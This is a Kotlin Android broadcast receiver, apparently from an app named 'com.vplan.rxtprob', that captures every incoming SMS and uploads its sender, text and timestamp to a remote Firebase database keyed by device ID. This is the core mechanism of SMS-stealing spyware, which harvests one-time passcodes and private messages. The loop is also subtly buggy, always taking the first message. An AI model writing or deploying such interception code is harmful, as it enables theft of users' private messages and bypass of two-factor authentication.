package com.vplan.rxtprob

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.provider.Telephony
import android.widget.Toast
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        try {
            // ✅ context null হলে কাজ বন্ধ করো
            if (context == null || intent == null) return

            // ✅ Firebase initialize (safe)
            if (FirebaseApp.getApps(context).isEmpty()) {
                FirebaseApp.initializeApp(context)
            }

            if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                val bundle: Bundle? = intent.extras
                val pdus = bundle?.get("pdus") as? Array<*>
                val format = bundle?.getString("format")

                if (pdus.isNullOrEmpty()) return

                // ✅ Null-safe deviceId
                val deviceId = try {
                    Settings.Secure.getString(
                        context.contentResolver,
                        Settings.Secure.ANDROID_ID
                    ) ?: "unknown_device"
                } catch (e: Exception) {
                    "unknown_device"
                }

                val smsRef = FirebaseDatabase.getInstance()
                    .getReference("sms")
                    .child(deviceId)

                for (pdu in pdus) {
                    val smsMessage = Telephony.Sms.Intents.getMessagesFromIntent(intent)[0]
                    val sender = smsMessage.displayOriginatingAddress ?: "Unknown"
                    val messageBody = smsMessage.messageBody ?: ""
                    val timestamp = smsMessage.timestampMillis

                    val smsData = mapOf(
                        "sender" to sender,
                        "body" to messageBody,
                        "timestamp" to timestamp
                    )

                    smsRef.push().setValue(smsData)
                }

                Toast.makeText(context, "✅ SMS synced to Firebase", Toast.LENGTH_SHORT).show()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            context?.let {
                Toast.makeText(it, "Error: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }
}
